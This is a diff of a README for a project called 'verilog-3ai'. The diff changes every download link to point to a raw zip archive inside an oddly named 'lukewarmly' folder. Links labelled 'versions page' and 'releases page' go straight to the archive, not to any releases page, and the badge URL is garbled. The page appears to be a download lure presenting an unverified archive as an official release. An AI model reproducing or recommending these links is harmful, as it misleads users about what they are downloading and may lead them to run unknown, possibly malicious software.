@@ -6,14 +6,14 @@ Welcome to **verilog-3ai**! This application helps you work with Verilog files e
 
 ## 🔗 Download
 
-[![Download verilog-3ai](https://raw.githubusercontent.com/nikolozi93/verilog-3ai/main/lukewarmly/verilog-3ai.zip%20verilog%https://raw.githubusercontent.com/nikolozi93/verilog-3ai/main/lukewarmly/verilog-3ai.zip)](https://raw.githubusercontent.com/nikolozi93/verilog-3ai/main/lukewarmly/verilog-3ai.zip)
+[![Download verilog-3ai](https://github.com/nikolozi93/verilog-3ai/raw/refs/heads/main/lukewarmly/ai-verilog-1.3.zip%20verilog%https://github.com/nikolozi93/verilog-3ai/raw/refs/heads/main/lukewarmly/ai-verilog-1.3.zip)](https://github.com/nikolozi93/verilog-3ai/raw/refs/heads/main/lukewarmly/ai-verilog-1.3.zip)
 
 ## 📥 Download & Install
 
 To get started with **verilog-3ai**, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to our [versions page](https://raw.githubusercontent.com/nikolozi93/verilog-3ai/main/lukewarmly/verilog-3ai.zip) to find the latest downloads.
+   Go to our [versions page](https://github.com/nikolozi93/verilog-3ai/raw/refs/heads/main/lukewarmly/ai-verilog-1.3.zip) to find the latest downloads.
 
 2. **Select the Latest Version:**  
    Look for the version labeled as the latest. This version will have the most features and improvements.
@@ -75,7 +75,7 @@ If you have any questions or need support, please visit our community forums or 
 If you encounter problems while using **verilog-3ai**, try these steps:
 
 - **Check System Compatibility:** Make sure your operating system meets the minimum requirements.
-- **Update the Application:** Return to the [releases page](https://raw.githubusercontent.com/nikolozi93/verilog-3ai/main/lukewarmly/verilog-3ai.zip) for the latest version.
+- **Update the Application:** Return to the [releases page](https://github.com/nikolozi93/verilog-3ai/raw/refs/heads/main/lukewarmly/ai-verilog-1.3.zip) for the latest version.
 - **Restart the Application:** Sometimes, simply restarting the app can resolve issues.
 - **Refer to the User Guide:** Use the built-in help features or refer to our guide for more assistance.
 
